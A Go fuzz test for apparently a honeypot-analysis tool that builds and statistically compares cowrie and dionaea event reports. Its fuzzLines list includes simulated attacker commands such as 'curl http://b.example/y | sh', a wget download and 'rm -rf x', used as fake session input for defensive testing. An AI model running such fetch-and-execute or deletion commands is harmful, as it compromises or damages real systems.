	if len(c.Notes) != 1 || !strings.Contains(c.Notes[0], "no per-session samples") {
		t.Errorf("notes = %q", c.Notes)
	}
	var text bytes.Buffer
	if err := WriteText(&text, []*Report{&back[0], &back[1]}); err != nil || !strings.Contains(text.String(), "Not analysed. A report carries no source table") {
		t.Errorf("text after JSON: %v\n%s", err, text.String())
	}
}

// fuzzPool is what a fuzzed event may name as its source.
var fuzzPool = []string{
	"203.0.113.1", "203.0.113.2", "203.0.113.3", "198.51.100.1", "198.51.100.2", "192.0.2.77",
	"2001:db8:1:2::a", "2001:db8:1:2::b", "2001:db8:9::1", "::ffff:203.0.113.1",
	"10.0.0.1", "127.0.0.1", "169.254.3.3", "100.64.0.9", "", "garbage",
}

var fuzzTypes = []string{
	".session.connect", ".login.failed", ".login.success", ".command.input",
	".session.file_download", ".session.file_download.failed", ".session.closed", ".command.input",
}

var fuzzLines = []string{"uname -a", "id", "ls", "wget http://a.example/x", "cat /proc/cpuinfo", "rm -rf x", "echo ok", "curl http://b.example/y | sh"}

// fuzzEvents turns bytes into the events of two deployments, six bytes an
// event.
func fuzzEvents(data []byte) (a, b []Event) {
	for ; len(data) >= 6; data = data[6:] {
		honeypot := "cowrie"
		if data[0]&2 != 0 {
			honeypot = "dionaea"
		}
		e := Event{
			Time:     t0.Add(time.Duration(int(data[3])<<8|int(data[4])) * 37 * time.Second),
			Honeypot: honeypot,
			SourceIP: fuzzPool[int(data[1])%len(fuzzPool)],
			Type:     honeypot + fuzzTypes[int(data[0]>>2)%len(fuzzTypes)],
		}
		if id := data[2] % 7; id != 0 && honeypot == "cowrie" {
			e.SessionID = fmt.Sprint("s", id, "-", data[2]>>5)
		}
		switch {
		case data[5] == 255:
			e.Time = time.Time{}
		case strings.HasSuffix(e.Type, ".command.input"):
			e.Command = fuzzLines[int(data[5])%len(fuzzLines)]
		case strings.HasSuffix(e.Type, ".login.success"):
			e.Username, e.Password = "root", fmt.Sprint("pw", data[5]%4)
		case strings.HasSuffix(e.Type, ".session.closed"):
			e.ReportedDuration = time.Duration(data[5]) * time.Second
		}
		if data[0]&1 == 0 {
			a = append(a, e)
		} else {
			b = append(b, e)
		}
	}
	return a, b
}

func isProbability(p float64) bool {
	return !math.IsNaN(p) && p >= 0 && p <= 1
}

// checkReport fails when a report holds an interval that is out of order or
// does not hold its own figure.
func checkReport(t *testing.T, r *Report) {
	t.Helper()
	scopes := []Metrics{r.Overall}
	for _, h := range r.Honeypots {
		scopes = append(scopes, h.Metrics)
	}
	for _, m := range scopes {
		for _, iv := range m.Intervals {
			var value float64
			found := false
			for _, def := range definitions {
				if def.Key == iv.Key {
					value, found = def.value(&m)
				}
			}
			// A figure is rounded to its unit, so it may sit a rounding
			// step outside ends that are rounded too.
			if !found || math.IsNaN(iv.Low) || math.IsNaN(iv.High) || iv.Low > iv.High || iv.N <= 0 || iv.Low < 0 ||
				value < iv.Low-0.011 || value > iv.High+0.011 || (iv.Method == MethodWilson && iv.High > 100) {
				t.Fatalf("interval %+v around %v", iv, value)
			}
		}
	}
	s := r.Sources
	if s.Sources != s.Public+s.Reserved || s.BusiestPercent < 0 || s.BusiestPercent > 100 || s.BusiestSessions > r.Overall.Sessions ||
		s.SessionsWithoutSource+s.SessionsFromReserved > r.Overall.Sessions || s.Collapsed != (s.CollapsedReason != "") {
		t.Fatalf("source summary %+v of %d sessions", s, r.Overall.Sessions)
	}
}

// checkComparison fails when a comparison holds a probability outside 0..1
// or an interval that is out of order.
func checkComparison(t *testing.T, c Comparison) {
	t.Helper()
	tested := 0
	for _, d := range c.Deltas {
		for _, p := range []*float64{d.PValue, d.PAdjusted, d.BLarger} {
			if p != nil && !isProbability(*p) {
				t.Fatalf("%s: %v is not a probability: %+v", d.Key, *p, d)
			}
		}
		if (d.PValue == nil) != (d.PAdjusted == nil) || (d.PValue != nil && *d.PAdjusted < *d.PValue) {
			t.Fatalf("%s: p-values %v and %v", d.Key, d.PValue, d.PAdjusted)
		}
		if d.PValue != nil {
			tested++
			if d.AN < MinCompare || d.BN < MinCompare || (d.Verdict == VerdictClear) != (*d.PAdjusted <= Alpha) || (d.Verdict != VerdictClear && d.Verdict != VerdictNone) {
				t.Fatalf("%s: verdict %q with adjusted p %v and bases %d, %d", d.Key, d.Verdict, *d.PAdjusted, d.AN, d.BN)
			}
		}
		if iv := d.DifferenceInterval; iv != nil {
			if math.IsNaN(iv.Low) || math.IsNaN(iv.High) || iv.Low > iv.High || iv.Low < -100 || iv.High > 100 ||
				(d.Defined && (d.Difference < iv.Low-0.011 || d.Difference > iv.High+0.011)) {
				t.Fatalf("%s: difference %v with interval %+v", d.Key, d.Difference, *iv)
			}
		}
	}
	if tested != c.TestedRows {
		t.Fatalf("%d rows carry a p-value, TestedRows = %d", tested, c.TestedRows)
	}
	e := c.Exposure
	if !isProbability(e.Jaccard) || e.OverlapPercent < 0 || e.OverlapPercent > 100 || e.OverlapSeconds < 0 ||
		e.SharedSources > e.ComparedA || e.SharedSources > e.ComparedB || e.ComparedA > e.A.PublicSources || e.ComparedB > e.B.PublicSources ||
		e.Comparable != (len(e.Problems) == 0) || (e.SessionRatio != 0 && e.SessionRatio < 1) {
		t.Fatalf("exposure %+v", e)
	}
	p := c.Paired
	if p.Shared != e.SharedSources || p.Skipped != (p.Reason != "") || p.Skipped != (len(p.Measures) == 0) {
		t.Fatalf("shared sources %+v", p)
	}
	for _, m := range p.Measures {
		if !isProbability(m.PValue) || !isProbability(m.PAdjusted) || m.PAdjusted < m.PValue || m.AFurther+m.BFurther+m.Tied != p.Shared ||
			(m.Verdict == VerdictClear) != (m.PAdjusted <= Alpha) {
			t.Fatalf("measure %+v of %d shared sources", m, p.Shared)
		}
	}
}

// FuzzCompare feeds two fuzzed event streams through the whole comparison:
// nothing may panic, every probability must lie in 0..1, every interval must
// be in order, swapping the sides must keep every p-value, and the order of
// the events must not matter.
func FuzzCompare(f *testing.F) {
	rng := rand.New(rand.NewSource(1))
	for _, n := range []int{0, 6, 60, 600, 3000} {
		seed := make([]byte, n)
		for i := range seed {
			seed[i] = byte(rng.Intn(256))
		}
		f.Add(seed, uint8(n))
	}
	f.Add([]byte{0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0}, uint8(1))
	f.Fuzz(func(t *testing.T, data []byte, knobs uint8) {
		if len(data) > 1<<16 {
			return
		}
		var opt Options
		if knobs&1 != 0 {
			opt = Options{SampleLimit: 1 + int(knobs>>1)%7, SourceLimit: 1 + int(knobs>>4)%5, SessionLimit: 3 + int(knobs>>2)%40, SessionCommandLimit: 2}
		}
		ea, eb := fuzzEvents(data)
		build := func() (*Report, *Report) {
			a, err := Compute("a", sliceSource(ea), opt)
			if err != nil {
				t.Fatal(err)
			}
			b, err := Compute("b", sliceSource(eb), opt)
			if err != nil {
				t.Fatal(err)
			}
			return a, b
		}
		a, b := build()
		checkReport(t, a)
		checkReport(t, b)
		ab, ba := Compare(*a, *b), Compare(*b, *a)
		checkComparison(t, ab)
		checkComparison(t, ba)
		for i, x := range ab.Deltas {
			y := ba.Deltas[i]
			if (x.PValue == nil) != (y.PValue == nil) || (x.PValue != nil && (*x.PValue != *y.PValue || *x.PAdjusted != *y.PAdjusted)) || x.Verdict != y.Verdict {
				t.Fatalf("%s changes when the sides are swapped: %+v against %+v", x.Key, x, y)
			}
		}
		if ab.Paired.Shared != ba.Paired.Shared || ab.Exposure.Jaccard != ba.Exposure.Jaccard || ab.Exposure.Comparable != ba.Exposure.Comparable {
			t.Fatalf("the exposure changes when the sides are swapped: %+v against %+v", ab.Exposure, ba.Exposure)
		}
		for i, x := range ab.Paired.Measures {
			if y := ba.Paired.Measures[i]; x.AFurther != y.BFurther || x.BFurther != y.AFurther || x.PValue != y.PValue {
				t.Fatalf("measure %s changes when the sides are swapped: %+v against %+v", x.Key, x, y)
			}
		}
		if err := WriteText(io.Discard, []*Report{a, b, a}); err != nil {
			t.Fatal(err)
		}

		// The same events backwards give the same reports.
		for _, events := range [][]Event{ea, eb} {
			for i, j := 0, len(events)-1; i < j; i, j = i+1, j-1 {
				events[i], events[j] = events[j], events[i]
			}
		}
		ra, rb := build()
		if !reflect.DeepEqual(a, ra) || !reflect.DeepEqual(b, rb) {
			t.Fatalf("the reports change when the events are read backwards")
		}
	})
}
